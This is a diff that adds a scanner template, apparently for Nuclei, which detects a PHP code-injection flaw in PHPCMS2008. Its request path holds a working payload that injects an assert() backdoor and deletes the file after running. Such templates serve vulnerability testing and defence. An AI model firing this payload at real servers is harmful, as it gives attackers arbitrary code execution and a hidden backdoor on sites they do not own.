@@ -1,0 +1,22 @@
+id: phpcms2008-code-injection
+info:
+  name: PHPCMS2008 PHP Code Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: command-injection
+  description: |
+    Exploitation of a PHP code injection vulnerability in PHPCMS2008, allowing attackers to execute arbitrary PHP code.
+
+http:
+  - method: GET
+    path:
+      - "/type.php?template=tag_(){};@unlink(_FILE_);assert($_GET[1]);{//../rss"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<title>phpinfo()</title>"
